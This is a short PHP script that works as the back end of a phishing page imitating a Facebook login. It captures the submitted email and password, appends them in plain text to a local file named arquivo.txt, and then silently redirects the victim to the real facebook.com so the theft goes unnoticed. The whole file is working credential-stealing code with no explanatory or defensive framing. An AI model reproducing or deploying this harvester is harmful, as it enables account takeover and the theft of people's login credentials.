<?php

	$username = @$_POST["email"];
	$passwd = @$_POST["pass"];
	$res = "".$username."-".$passwd."\n";
	//file_put_contents($username,"/var/www/html/arquivo.txt");
	//echo $username;
	//echo $passwd;	
	$f = fopen("arquivo.txt", "a+");
	fwrite($f, $res);
	fclose($f);
	//redirect("http://facebook.com");
	echo "<html><body><script>window.location.href='https://facebook.com'</script></body></html>";
?>
